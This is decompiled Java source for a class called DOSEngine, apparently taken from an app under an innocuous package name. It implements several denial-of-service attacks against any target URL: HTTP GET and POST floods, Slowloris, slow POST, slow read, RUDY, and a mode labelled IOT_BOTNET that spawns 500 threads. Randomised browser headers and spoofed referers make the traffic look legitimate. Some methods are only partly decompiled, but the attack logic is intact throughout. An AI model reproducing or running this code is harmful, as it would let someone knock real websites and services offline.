/*
 * Decompiled with CFR 0.152.
 */
package linker.resourcer.encoder;

import java.io.BufferedWriter;
import java.io.Closeable;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.Serializable;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.concurrent.ThreadLocalRandom;
import javax.net.ssl.SSLSocketFactory;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda3;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda4;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda5;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda6;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda7;
import linker.resourcer.encoder.DOSEngine$$ExternalSyntheticLambda8;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class DOSEngine {
    private static final String[] ACCEPT_HEADERS;
    private static final String[] ACCEPT_LANGS;
    public static String Activetype;
    public static String CurrentTarget;
    public static final String HTTP_FLOOD = "HTTP_FLOOD";
    public static final String HTTP_POST_FLOOD = "HTTP_POST_FLOOD";
    private static final DOSEngine INSTANCE;
    public static final String IOT_BOTNET = "IOT_BOTNET";
    private static final String[] REFERERS;
    public static final String RUDY = "RUDY";
    public static final String SLOWLORIS = "SLOWLORIS";
    public static final String SLOWPOST = "SLOWPOST";
    public static final String SLOWREAD = "SLOWREAD";
    private static final String[] USER_AGENTS;
    private static volatile long scannerDate;
    private volatile boolean running = false;
    private Thread scannerThread;

    static {
        INSTANCE = new DOSEngine();
        scannerDate = 0L;
        CurrentTarget = "N/A";
        Activetype = "N/A";
        USER_AGENTS = new String[]{"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230605.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.102 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Android 13; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0", "Mozilla/5.0 (Android 12; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"};
        ACCEPT_LANGS = new String[]{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.7", "de-DE,de;q=0.9,en;q=0.7", "es-ES,es;q=0.9,en;q=0.7"};
        ACCEPT_HEADERS = new String[]{"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7"};
        REFERERS = new String[]{"https://www.google.com/", "https://www.bing.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/"};
    }

    private DOSEngine() {
    }

    /*
     * Enabled aggressive block sorting
     */
    private void StartWork(String string2, URL uRL, int n) {
        int n2;
        String string3;
        block18: {
            string3 = uRL.getHost();
            switch (string2.hashCode()) {
                case 362108822: {
                    if (!string2.equals(HTTP_POST_FLOOD)) break;
                    n2 = 1;
                    break block18;
                }
                case 2526744: {
                    if (!string2.equals(RUDY)) break;
                    n2 = 5;
                    break block18;
                }
                case -300266729: {
                    if (!string2.equals(SLOWREAD)) break;
                    n2 = 4;
                    break block18;
                }
                case -300316127: {
                    if (!string2.equals(SLOWPOST)) break;
                    n2 = 3;
                    break block18;
                }
                case -723560648: {
                    if (!string2.equals(SLOWLORIS)) break;
                    n2 = 2;
                    break block18;
                }
                case -1626601113: {
                    if (!string2.equals(HTTP_FLOOD)) break;
                    n2 = 0;
                    break block18;
                }
                case -1769820185: {
                    if (!string2.equals(IOT_BOTNET)) break;
                    n2 = 6;
                    break block18;
                }
            }
            n2 = -1;
        }
        switch (n2) {
            default: {
                this.stop();
                return;
            }
            case 6: {
                System.out.println("[IOT_BOTNET] " + string3);
                Activetype = "[IOT BOTNET]";
                new Thread(new DOSEngine$$ExternalSyntheticLambda6(this, uRL, n)).start();
                return;
            }
            case 5: {
                Activetype = "[RUDY]";
                new Thread(new DOSEngine$$ExternalSyntheticLambda5(this, uRL, n)).start();
                return;
            }
            case 4: {
                Activetype = "[SLOW READ]";
                new Thread(new DOSEngine$$ExternalSyntheticLambda4(this, uRL, n)).start();
                return;
            }
            case 3: {
                Activetype = "[SLOW POST]";
                new Thread(new DOSEngine$$ExternalSyntheticLambda3(this, uRL, n)).start();
                return;
            }
            case 2: {
                Activetype = "[SLOW LORIS]";
                new Thread(new DOSEngine$$ExternalSyntheticLambda2(this, uRL, n)).start();
                return;
            }
            case 1: {
                Activetype = "[HTTP_POST_FLOOD]";
                new Thread(new DOSEngine$$ExternalSyntheticLambda1(this, uRL, n)).start();
                return;
            }
            case 0: 
        }
        Activetype = "[HTTP_FLOOD]";
        new Thread(new DOSEngine$$ExternalSyntheticLambda0(this, uRL, n)).start();
    }

    private String buildPostBody(int n) {
        Serializable serializable = ThreadLocalRandom.current();
        String string2 = "dev-" + Integer.toHexString(((ThreadLocalRandom)serializable).nextInt(0xFFFFFF));
        String string3 = "sess-" + Integer.toHexString(((ThreadLocalRandom)serializable).nextInt(0xFFFFFF));
        int n2 = ((ThreadLocalRandom)serializable).nextInt(0, 1000);
        long l = System.currentTimeMillis();
        serializable = new StringBuilder();
        ((StringBuilder)serializable).append("deviceId=").append(string2);
        ((StringBuilder)serializable).append("&sessionId=").append(string3);
        ((StringBuilder)serializable).append("&counter=").append(n);
        ((StringBuilder)serializable).append("&value=").append(n2);
        ((StringBuilder)serializable).append("&timestamp=").append(l);
        return ((StringBuilder)serializable).toString();
    }

    private String buildRequest(URL serializable) {
        String string2;
        String string3;
        String string4;
        String string5;
        String string6;
        Object object;
        block11: {
            int n;
            String string7;
            block13: {
                block12: {
                    block10: {
                        CharSequence charSequence;
                        block9: {
                            object = ((URL)serializable).getPath().isEmpty() ? "/" : ((URL)serializable).getPath();
                            charSequence = ((URL)serializable).getQuery();
                            string7 = "?";
                            string6 = object;
                            if (charSequence != null) {
                                string6 = object;
                                if (!((String)charSequence).isEmpty()) {
                                    string6 = (String)object + "?" + (String)charSequence;
                                }
                            }
                            object = ThreadLocalRandom.current();
                            string5 = USER_AGENTS[((ThreadLocalRandom)object).nextInt(USER_AGENTS.length)];
                            string4 = ACCEPT_HEADERS[((ThreadLocalRandom)object).nextInt(ACCEPT_HEADERS.length)];
                            string3 = ACCEPT_LANGS[((ThreadLocalRandom)object).nextInt(ACCEPT_LANGS.length)];
                            string2 = REFERERS[((ThreadLocalRandom)object).nextInt(REFERERS.length)];
                            if (charSequence == null) break block9;
                            object = string6;
                            if (!((String)charSequence).isEmpty()) break block10;
                        }
                        long l = System.currentTimeMillis();
                        charSequence = new StringBuilder().append(string6);
                        object = string7;
                        if (string6.contains("?")) {
                            object = "&";
                        }
                        object = ((StringBuilder)charSequence).append((String)object).append("t=").append(l).toString();
                    }
                    string7 = ((URL)serializable).getHost();
                    n = ((URL)serializable).getPort();
                    string6 = string7;
                    if (n <= 0) break block11;
                    if (!((URL)serializable).getProtocol().equalsIgnoreCase("http")) break block12;
                    string6 = string7;
                    if (n == 80) break block11;
                }
                if (!((URL)serializable).getProtocol().equalsIgnoreCase("https")) break block13;
                string6 = string7;
                if (n == 443) break block11;
            }
            string6 = string7 + ":" + n;
        }
        serializable = new StringBuilder();
        ((StringBuilder)serializable).append("GET ").append((String)object).append(" HTTP/1.1\r\n");
        ((StringBuilder)serializable).append("Host: ").append(string6).append("\r\n");
        ((StringBuilder)serializable).append("User-Agent: ").append(string5).append("\r\n");
        ((StringBuilder)serializable).append("Accept: ").append(string4).append("\r\n");
        ((StringBuilder)serializable).append("Accept-Language: ").append(string3).append("\r\n");
        ((StringBuilder)serializable).append("Accept-Encoding: gzip, deflate\r\n");
        ((StringBuilder)serializable).append("Referer: ").append(string2).append("\r\n");
        ((StringBuilder)serializable).append("Cache-Control: no-cache\r\n");
        ((StringBuilder)serializable).append("Pragma: no-cache\r\n");
        ((StringBuilder)serializable).append("Connection: keep-alive\r\n");
        ((StringBuilder)serializable).append("Upgrade-Insecure-Requests: 1\r\n");
        ((StringBuilder)serializable).append("\r\n");
        return ((StringBuilder)serializable).toString();
    }

    private String buildRudyBody() {
        ThreadLocalRandom threadLocalRandom = ThreadLocalRandom.current();
        String string2 = "dev-rudy-" + Integer.toHexString(threadLocalRandom.nextInt(0xFFFFFF));
        String string3 = "sess-" + Integer.toHexString(threadLocalRandom.nextInt(0xFFFFFF));
        long l = System.currentTimeMillis();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("deviceId=").append(string2);
        stringBuilder.append("&sessionId=").append(string3);
        stringBuilder.append("&mode=demo");
        stringBuilder.append("&timestamp=").append(l);
        for (int i = 0; i < 2000; ++i) {
            stringBuilder.append("&param").append(i).append("=");
            stringBuilder.append(Integer.toHexString(threadLocalRandom.nextInt())).append("_").append(threadLocalRandom.nextInt(0, 100000));
        }
        return stringBuilder.toString();
    }

    private String buildSlowPostBody(int n) {
        ThreadLocalRandom threadLocalRandom = ThreadLocalRandom.current();
        String string2 = "dev-" + Integer.toHexString(threadLocalRandom.nextInt(0xFFFFFF));
        String string3 = "sess-" + Integer.toHexString(threadLocalRandom.nextInt(0xFFFFFF));
        String string4 = "user" + threadLocalRandom.nextInt(1000, 9999);
        long l = System.currentTimeMillis();
        int n2 = threadLocalRandom.nextInt(0, 1000000);
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("deviceId=").append(string2);
        stringBuilder.append("&sessionId=").append(string3);
        stringBuilder.append("&userId=").append(string4);
        stringBuilder.append("&mode=slowpost-demo");
        stringBuilder.append("&counter=").append(n);
        stringBuilder.append("&timestamp=").append(l);
        stringBuilder.append("&randValue=").append(n2);
        n2 = threadLocalRandom.nextInt(50);
        for (n = 0; n < n2 + 30; ++n) {
            string3 = "extra" + n;
            string2 = Integer.toHexString(threadLocalRandom.nextInt()) + "_" + threadLocalRandom.nextInt(0, 100000);
            stringBuilder.append("&").append(string3).append("=").append(string2);
        }
        return stringBuilder.toString();
    }

    public static DOSEngine getInstance() {
        return INSTANCE;
    }

    /*
     * Exception decompiling
     */
    private void httpFlood(URL var1_1, int var2_4) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [5[CATCHBLOCK], 4[CATCHBLOCK], 7[FORLOOP]], but top level block is 3[TRYBLOCK]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    /*
     * Unable to fully structure code
     */
    private void httpPostFlood(URL var1_1, int var2_4) {
        var5_5 = ThreadLocalRandom.current();
        for (var2_4 = 0; var2_4 < 500; ++var2_4) {
            if (!this.running) break;
            var4_7 = (HttpURLConnection)var1_1.openConnection();
            var4_7.setConnectTimeout(15000);
            var4_7.setReadTimeout(0);
            var4_7.setRequestMethod("POST");
            var4_7.setDoOutput(true);
            var7_10 = DOSEngine.USER_AGENTS[var5_5.nextInt(DOSEngine.USER_AGENTS.length)];
            var6_9 = DOSEngine.ACCEPT_HEADERS[var5_5.nextInt(DOSEngine.ACCEPT_HEADERS.length)];
            var9_12 = DOSEngine.ACCEPT_LANGS[var5_5.nextInt(DOSEngine.ACCEPT_LANGS.length)];
            var8_11 = DOSEngine.REFERERS[var5_5.nextInt(DOSEngine.REFERERS.length)];
            var4_7.setRequestProperty("User-Agent", (String)var7_10);
            var4_7.setRequestProperty("Accept", (String)var6_9);
            var4_7.setRequestProperty("Accept-Language", var9_12);
            var4_7.setRequestProperty("Accept-Encoding", "gzip, deflate");
            var4_7.setRequestProperty("Referer", var8_11);
            var4_7.setRequestProperty("Cache-Control", "no-cache");
            var4_7.setRequestProperty("Pragma", "no-cache");
            var7_10 = this.buildPostBody(var2_4).getBytes(StandardCharsets.UTF_8);
            var4_7.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            var4_7.setRequestProperty("Content-Length", String.valueOf(((Object)var7_10).length));
            var6_9 = var4_7.getOutputStream();
            var6_9.write((byte[])var7_10);
            var6_9.flush();
            if (var6_9 == null) ** GOTO lbl32
            var6_9.close();
lbl32:
            // 2 sources

            var3_6 = var4_7.getResponseCode();
            var7_10 = System.out;
            var6_9 = new StringBuilder();
            var7_10.println(var6_9.append("[HTTP_POST_FLOOD] ").append(var2_4).append(" code=").append(var3_6).toString());
            var4_7.disconnect();
            Thread.sleep(10L);
            continue;
            catch (Throwable var1_2) {
                if (var6_9 == null) ** GOTO lbl47
                try {
                    var6_9.close();
                    ** GOTO lbl47
                }
                catch (Throwable var4_8) {
                    try {
                        var1_2.addSuppressed(var4_8);
lbl47:
                        // 3 sources

                        throw var1_2;
                    }
                    catch (Exception var1_3) {
                        System.out.println("[HTTP_POST_FLOOD_ERR] " + var1_3.getMessage());
                        break;
                    }
                }
            }
        }
    }

    private void iotBotnetDemo(URL uRL, int n) {
        for (int i = 0; i < 500 && this.running; ++i) {
            new Thread(new DOSEngine$$ExternalSyntheticLambda7(this, i, uRL, n)).start();
        }
    }

    public static boolean isEngineRunning() {
        boolean bl = System.currentTimeMillis() - scannerDate < 60000L;
        return bl;
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void rudyDemo(URL object, int n) {
        void var1_5;
        block9: {
            double d;
            int n2;
            byte[] byArray;
            BufferedWriter bufferedWriter;
            Object object2;
            Socket socket;
            try {
                socket = ((URL)object).getProtocol().equalsIgnoreCase("https") ? ((SSLSocketFactory)SSLSocketFactory.getDefault()).createSocket() : new Socket();
                object2 = new InetSocketAddress(((URL)object).getHost(), n);
                socket.connect((SocketAddress)object2, 15000);
                socket.setSoTimeout(0);
                object2 = new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8);
                bufferedWriter = new BufferedWriter((Writer)object2);
                object2 = ((URL)object).getPath().isEmpty() ? "/" : ((URL)object).getPath();
                byArray = this.buildRudyBody().getBytes(StandardCharsets.UTF_8);
                n = byArray.length;
                Object object3 = ThreadLocalRandom.current();
                String string2 = USER_AGENTS[((ThreadLocalRandom)object3).nextInt(USER_AGENTS.length)];
                String string3 = ACCEPT_HEADERS[((ThreadLocalRandom)object3).nextInt(ACCEPT_HEADERS.length)];
                String string4 = ACCEPT_LANGS[((ThreadLocalRandom)object3).nextInt(ACCEPT_LANGS.length)];
                object3 = REFERERS[((ThreadLocalRandom)object3).nextInt(REFERERS.length)];
                object = ((URL)object).getHost();
                StringBuilder stringBuilder = new StringBuilder();
                bufferedWriter.write(stringBuilder.append("POST ").append((String)object2).append(" HTTP/1.1\r\n").toString());
                object2 = new StringBuilder();
                bufferedWriter.write(((StringBuilder)object2).append("Host: ").append((String)object).append("\r\n").toString());
                object = new StringBuilder();
                bufferedWriter.write(((StringBuilder)object).append("User-Agent: ").append(string2).append("\r\n").toString());
                object = new StringBuilder();
                bufferedWriter.write(((StringBuilder)object).append("Accept: ").append(string3).append("\r\n").toString());
                object = new StringBuilder();
                bufferedWriter.write(((StringBuilder)object).append("Accept-Language: ").append(string4).append("\r\n").toString());
                bufferedWriter.write("Accept-Encoding: gzip, deflate\r\n");
                object = new StringBuilder();
                bufferedWriter.write(((StringBuilder)object).append("Referer: ").append((String)object3).append("\r\n").toString());
                bufferedWriter.write("Content-Type: application/x-www-form-urlencoded\r\n");
                object = new StringBuilder();
                bufferedWriter.write(((StringBuilder)object).append("Content-Length: ").append(n).append("\r\n").toString());
                bufferedWriter.write("Cache-Control: no-cache\r\n");
                bufferedWriter.write("Pragma: no-cache\r\n");
                bufferedWriter.write("Connection: close\r\n\r\n");
                bufferedWriter.flush();
                n2 = 500;
                d = Math.ceil((double)byArray.length / (double)500);
            }
            catch (Exception exception) {
                // empty catch block
                break block9;
            }
            n = (int)d;
            for (int i = 0; i < n2; ++i) {
                int n3;
                try {
                    if (!this.running) break;
                    n3 = i * n;
                }
                catch (Exception exception) {
                    break block9;
                }
                {
                    int n4 = Math.min(n3 + n, byArray.length);
                    if (n3 >= n4) break;
                    object = new String(byArray, n3, n4 - n3, StandardCharsets.UTF_8);
                    bufferedWriter.write((String)object);
                    bufferedWriter.flush();
                    object2 = System.out;
                    object = new StringBuilder();
                    ((PrintStream)object2).println(((StringBuilder)object).append("[PART] ").append(i + 1).toString());
                    try {
                        Thread.sleep(3000L);
                        continue;
                    }
                    catch (InterruptedException interruptedException) {
                        // empty catch block
                        break;
                    }
                }
            }
            {
                socket.close();
                System.out.println("[RUDY_END]");
                return;
            }
        }
        System.out.println("[RUDY_ERR] " + var1_5.getMessage());
    }

    /*
     * Unable to fully structure code
     */
    private void slowLorisDemo(URL var1_1, int var2_23) {
        block69: {
            block74: {
                block70: {
                    var6_24 = var1_1.getProtocol().equalsIgnoreCase("https");
                    var3_25 = 10;
                    var5_26 = 10000;
                    var11_27 = new ArrayList<Object>();
                    var12_28 = new ArrayList<Object>();
                    try {
                        var8_29 = ThreadLocalRandom.current();
                    }
                    catch (Throwable var1_20) {
                        break block69;
                    }
                    catch (Exception var1_21) {
                        // empty catch block
                    }
                    for (var4_34 = 0; var4_34 < var3_25; ++var4_34) {
                        block71: {
                            block68: {
                                var7_35 = this.running;
                                if (!var7_35) break;
                                if (!var6_24) break block68;
                                try {
                                    var9_36 = ((SSLSocketFactory)SSLSocketFactory.getDefault()).createSocket();
                                    ** GOTO lbl23
                                }
                                catch (Throwable var1_2) {
                                    break block69;
                                }
                                catch (Exception var1_3) {
                                    break block70;
                                }
                            }
                            var9_36 = new Socket();
lbl23:
                            // 2 sources

                            var13_40 = var1_1.getHost();
                            var10_39 = new InetSocketAddress((String)var13_40, var2_23);
                            var9_36.connect((SocketAddress)var10_39, 15000);
                            var9_36.setTcpNoDelay(true);
                            var9_36.setSoTimeout(0);
                            var10_39 = var9_36.getOutputStream();
                            var14_41 = new OutputStreamWriter((OutputStream)var10_39, StandardCharsets.UTF_8);
                            var13_40 = new BufferedWriter((Writer)var14_41);
                            if (!var1_1.getPath().isEmpty()) break block71;
                            var10_39 = "/";
                            ** GOTO lbl40
                        }
                        try {
                            var10_39 = var1_1.getPath();
lbl40:
                            // 2 sources

                            var14_41 = DOSEngine.USER_AGENTS[var8_29.nextInt(DOSEngine.USER_AGENTS.length)];
                            var15_42 = new StringBuilder();
                            var13_40.write(var15_42.append("GET ").append((String)var10_39).append(" HTTP/1.1\r\n").toString());
                            var10_39 = new StringBuilder();
                            var13_40.write(var10_39.append("Host: ").append(var1_1.getHost()).append("\r\n").toString());
                            var10_39 = new StringBuilder();
                            var13_40.write(var10_39.append("User-Agent: ").append((String)var14_41).append("\r\n").toString());
                            var13_40.flush();
                            var11_27.add(var9_36);
                            var12_28.add(var13_40);
                            var9_36 = System.out;
                            var10_39 = new StringBuilder();
                            var9_36.println(var10_39.append("[SLOWLORIS_OPEN] ").append(var4_34 + 1).toString());
                            continue;
                        }
                        catch (Throwable var1_4) {
                            break block69;
                        }
                        catch (Exception var1_5) {
                            break block70;
                        }
                        catch (Throwable var1_6) {
                            break block69;
                        }
                        catch (Exception var1_7) {
                            break block70;
                        }
                        catch (Throwable var1_8) {
                            break block69;
                        }
                        catch (Exception var1_9) {
                            break block70;
                        }
                        catch (Throwable var1_10) {
                            break block69;
                        }
                        catch (Exception var1_12) {
                            break block70;
                        }
                    }
                    var2_23 = var5_26;
                    for (var3_25 = 0; var3_25 < var2_23; ++var3_25) {
                        var5_26 = var2_23;
                        var5_26 = var2_23;
                        if (!this.running) break;
                        var5_26 = var2_23;
                        var5_26 = var2_23;
                        var5_26 = var2_23;
                        var5_26 = var2_23;
                        var1_1 = new StringBuilder();
                        var5_26 = var2_23;
                        var5_26 = var2_23;
                        var8_29 = var1_1.append("X-Keep-").append(var3_25).toString();
                        var4_34 = 0;
                        while (true) {
                            block72: {
                                block73: {
                                    var5_26 = var2_23;
                                    var5_26 = var2_23;
                                    if (var4_34 >= var12_28.size()) break;
                                    var5_26 = var2_23;
                                    var5_26 = var2_23;
                                    var1_1 = (BufferedWriter)var12_28.get(var4_34);
                                    var5_26 = var2_23;
                                    var5_26 = var2_23;
                                    var9_36 = (Socket)var11_27.get(var4_34);
                                    var5_26 = var2_23;
                                    var5_26 = var2_23;
                                    var6_24 = var9_36.isClosed();
                                    if (var6_24) break block72;
                                    var5_26 = var2_23;
                                    var5_26 = var2_23;
                                    var10_39 = new StringBuilder();
                                    var5_26 = var2_23;
                                    var13_40 = var10_39.append("v");
                                    var5_26 = var2_23;
                                    var10_39 = ThreadLocalRandom.current();
                                    try {
                                        var13_40 = var13_40.append(var10_39.nextInt(0, 100000)).toString();
                                        var10_39 = new StringBuilder();
                                        var1_1.write(var10_39.append((String)var8_29).append(": ").append((String)var13_40).append("\r\n").toString());
                                        var1_1.flush();
                                        var1_1 = System.out;
                                        var10_39 = new StringBuilder();
                                        var1_1.println(var10_39.append("[SLOWLORIS_HDR] step=").append(var3_25).append(" conn=").append(var4_34).toString());
                                        break block72;
                                    }
                                    catch (Exception var1_13) {
                                        break block73;
                                    }
                                    catch (Exception var1_14) {
                                        // empty catch block
                                    }
                                }
                                var10_39 = System.out;
                                var13_40 = new StringBuilder();
                                var10_39.println(var13_40.append("[SLOWLORIS_CONN_ERR] conn=").append(var4_34).append(" ").append(var1_1.getMessage()).toString());
                                try {
                                    var9_36.close();
                                }
                                catch (Exception var1_15) {}
                            }
                            ++var4_34;
                        }
                        try {
                            Thread.sleep(4000L);
                            continue;
                        }
                        catch (InterruptedException var1_17) {
                            break;
                        }
                        {
                            catch (Exception var1_16) {
                                break block70;
                            }
                        }
                        catch (Throwable var1_18) {
                            break block69;
                        }
                        catch (Exception var1_19) {
                            break block70;
                        }
                    }
                    for (Object var8_29 : var12_28) {
                        try {
                            var8_29.close();
                        }
                        catch (Exception var8_30) {}
                    }
                    for (Object var8_29 : var11_27) {
                        try {
                            var8_29.close();
                        }
                        catch (Exception var8_31) {}
                    }
                    while (true) {
                        break block74;
                        break;
                    }
                }
                try {
                    var8_29 = System.out;
                    var9_36 = new StringBuilder();
                    var8_29.println(var9_36.append("[SLOWLORIS_ERR] ").append(var1_1.getMessage()).toString());
                }
                catch (Throwable var1_22) {
                    // empty catch block
                }
                for (Object var8_29 : var12_28) {
                    try {
                        var8_29.close();
                    }
                    catch (Exception var8_32) {}
                }
                var1_1 = var11_27.iterator();
                while (true) {
                    if (!var1_1.hasNext()) ** continue;
                    var8_29 = (Socket)var1_1.next();
                    try {
                        var8_29.close();
                    }
                    catch (Exception var8_33) {}
                }
            }
            System.out.println("[SLOWLORIS_END]");
            return;
        }
        for (Object var9_36 : var12_28) {
            try {
                var9_36.close();
            }
            catch (Exception var9_37) {}
        }
        for (Object var9_36 : var11_27) {
            try {
                var9_36.close();
            }
            catch (Exception var9_38) {}
        }
        System.out.println("[SLOWLORIS_END]");
        throw var1_11;
    }

    /*
     * Loose catch block
     * WARNING - void declaration
     * Enabled aggressive exception aggregation
     */
    private void slowPostDemo(URL object, int n) {
        void var1_5;
        block9: {
            int n2;
            int n3;
            byte[] byArray;
            Object object2;
            Socket socket = ((URL)object).getProtocol().equalsIgnoreCase("https") ? ((SSLSocketFactory)SSLSocketFactory.getDefault()).createSocket() : new Socket();
            Object object3 = ((URL)object).getHost();
            try {
                object2 = new InetSocketAddress((String)object3, n);
                socket.connect((SocketAddress)object2, 15000);
                socket.setSoTimeout(0);
                object3 = new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8);
                object2 = new BufferedWriter((Writer)object3);
                object3 = ((URL)object).getPath().isEmpty() ? "/" : ((URL)object).getPath();
                byArray = this.buildSlowPostBody(0).getBytes(StandardCharsets.UTF_8);
                n = byArray.length;
                StringBuilder stringBuilder = new StringBuilder();
                ((Writer)object2).write(stringBuilder.append("POST ").append((String)object3).append(" HTTP/1.1\r\n").toString());
                object3 = new StringBuilder();
                ((Writer)object2).write(((StringBuilder)object3).append("Host: ").append(((URL)object).getHost()).append("\r\n").toString());
                ((Writer)object2).write("Content-Type: application/x-www-form-urlencoded\r\n");
                object = new StringBuilder();
                ((Writer)object2).write(((StringBuilder)object).append("Content-Length: ").append(n).append("\r\n").toString());
                ((Writer)object2).write("Connection: close\r\n\r\n");
                ((BufferedWriter)object2).flush();
                n3 = (int)Math.ceil((double)byArray.length / (double)100);
                for (n = 0; n < 100 && this.running; ++n) {
                    n2 = n * n3;
                }
            }
            catch (Exception exception) {}
            {
                int n4 = Math.min(n2 + n3, byArray.length);
                if (n2 >= n4) break;
                object = new String(byArray, n2, n4 - n2, StandardCharsets.UTF_8);
                ((Writer)object2).write((String)object);
                ((BufferedWriter)object2).flush();
                object = System.out;
                object3 = new StringBuilder();
                ((PrintStream)object).println(((StringBuilder)object3).append("[SLOWPOST_PART] ").append(n + 1).toString());
                try {
                    Thread.sleep(3500L);
                }
                catch (Exception exception) {
                }
            }
            socket.close();
            break block9;
            catch (Exception exception) {
                // empty catch block
            }
        }
        System.out.println("[SLOWPOST_ERR] " + var1_5.getMessage());
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void slowReadDemo(URL object, int n) {
        void var1_5;
        block10: {
            Object object2;
            Socket socket;
            try {
                boolean bl = ((URL)object).getProtocol().equalsIgnoreCase("https");
                socket = bl ? ((SSLSocketFactory)SSLSocketFactory.getDefault()).createSocket() : new Socket();
                object2 = ((URL)object).getHost();
            }
            catch (Exception exception) {
                // empty catch block
                break block10;
            }
            try {
                int n2;
                Object object3 = new InetSocketAddress((String)object2, n);
                socket.connect((SocketAddress)object3, 2000);
                object3 = new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8);
                Closeable closeable = new BufferedWriter((Writer)object3);
                object3 = ((URL)object).getPath().isEmpty() ? "/" : ((URL)object).getPath();
                CharSequence charSequence = ((URL)object).getQuery();
                object2 = object3;
                if (charSequence != null) {
                    object2 = object3;
                    if (!((String)charSequence).isEmpty()) {
                        object2 = new StringBuilder();
                        object2 = ((StringBuilder)object2).append((String)object3).append("?").append((String)charSequence).toString();
                    }
                }
                object3 = ThreadLocalRandom.current();
                String string2 = USER_AGENTS[((ThreadLocalRandom)object3).nextInt(USER_AGENTS.length)];
                String string3 = ACCEPT_HEADERS[((ThreadLocalRandom)object3).nextInt(ACCEPT_HEADERS.length)];
                charSequence = ACCEPT_LANGS[((ThreadLocalRandom)object3).nextInt(ACCEPT_LANGS.length)];
